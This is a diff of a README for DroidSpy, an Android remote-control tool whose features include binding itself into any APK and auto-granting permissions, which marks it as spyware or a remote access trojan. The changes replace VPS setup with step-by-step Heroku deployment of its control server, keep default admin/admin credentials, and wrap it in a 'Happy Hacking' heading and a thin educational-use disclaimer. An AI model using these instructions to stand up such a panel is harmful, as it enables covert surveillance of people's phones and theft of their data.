@@ -22,50 +22,38 @@ A cloud based remote android managment suite, powered by NodeJS
 - Auto Allow Permission
 - Easy Bind Any Apk
 
-## Prerequisites 
- - Java Runtime Environment 8
-    - See [installation](#Installation) for OS specifics
- - NodeJs 
- - A Server
+## Installation on VPS & PC [Click Here](https://github.com/Linuxndroid/DroidSpy)
 
-## Installation ON VPS & PC
-   Video Tutorial For VPS And PC [Click Here](https://youtu.be/ZpAQGTdGzE8)
-1. Install JRE 8 
-    - Debian, Ubuntu, Etc
-        - `sudo apt-get install openjdk-8-jre`
-    - Fedora, Oracle, Red Hat, etc
-        -  `su -c "yum install java-1.8.0-openjdk"`
-    - Windows 
-        - click [HERE](https://www.oracle.com/technetwork/java/javase/downloads/jre8-downloads-2133155.html) for downloads
+## Installation on Heroku Free Server
 
-2. Install NodeJS [Instructions Here](https://nodejs.org/en/download/package-manager/) (If you can't figure this out, you shouldn't really be using this)
+0. Create a Account on [Heroku](https://heroku.com)
 
-3. install PM2 
-    - `npm install pm2 -g`
+1. Click `Create New App` in Heroku Dashboard
 
-4. Download and Extract [HERE](https://codeload.github.com/Linuxndroid/DroidSpy/zip/master)
+2. Enter App Name and click on create app
 
-5. In the extracted folder, run these commands
-    - `npm install` <- install dependencies
-    - `pm2 start index.js` <-- start the DroidSpy
-    - `pm2 startup` <- to run DroidSpy on startup
+3. Now install Heroku CLI on your Computer [Instuctions](https://devcenter.heroku.com/articles/heroku-cli)
 
-6. Default Username & Password check password.txt file
+4. Now open your terminal and run command `git clone -b herooku https://github.com/Linuxndroid/DroidSpy`
+
+5. It will download Latest codes for you in your PC
+    
+6. Now change the directory to DroidSpy using command `cd DroidSpy`
+
+7. Now Login into Heroku CLI using command `heroku login -i` now enter your login details and hit Enter
+
+8. After Login run this command in terminal `heroku git:remote -a appName` here appName will be your app's name that you choose while creating the app.
+
+9. Now run follow commands in termial to install packages `heroku buildpacks:add heroku/jvm` then run `heroku buildpacks:add heroku/nodejs`
+
+10. Now run this command in your terminal `git push heroku herooku:master`, if this gives an error try this `git push -f heroku herooku:master`
+
+11. All done now it will take time to complete, after that you can visit your domain shown in terminal.
+    
+
+12. Default Username & Password check password.txt file
     - Username: admin
     - Password: admin
-    
-7. Set Username & Password Manually  
-    1. Stop DroidSpy `pm2 stop index`
-    2. Open `maindb.json` in a text editor
-    3. under `admin` 
-        - set the `username` as plain text
-        - set the `password` as a LOWERCASE MD5 hash
-    4. save the file
-    5. run `pm2 restart all`
-
-8. in your browser navigate to `http://<SERVER IP>:22533`
-    
-It's recommended to run DroidSpy behind a reverse proxy such as [NGINX](https://www.nginx.com/resources/wiki/start/topics/tutorials/install/)
 
 ## Happy Hacking
 ## Disclaimer
@@ -76,7 +64,7 @@ DroidSpy is built for both Educational and Internal use ONLY.</b>
 <p align="center">Made with ❤️ By <a href="https://www.youtube.com/channel/UC2O1Hfg-dDCbUcau5QWGcgg">Linuxndroid</a></p>
 
 ## Credits
+      
+ Credit BY Xploitwizer (https://www.youtube.com/channel/UCnizLUNzV9FvcK5Spj-KISA)
 
-<b> Credits to <a href="https://github.com/D3VL">D3VL</a> for the original code base this repository is based on at <a href="https://github.com/D3VL/L3MON">L3MON</a>
-
-Inspired by INFINITYHACKS (https://github.com/ExtremeHacking/infinityhacks-botnet)
+Inspired by XploitSPY (https://github.com/Xploitwizer/XploitSPY)
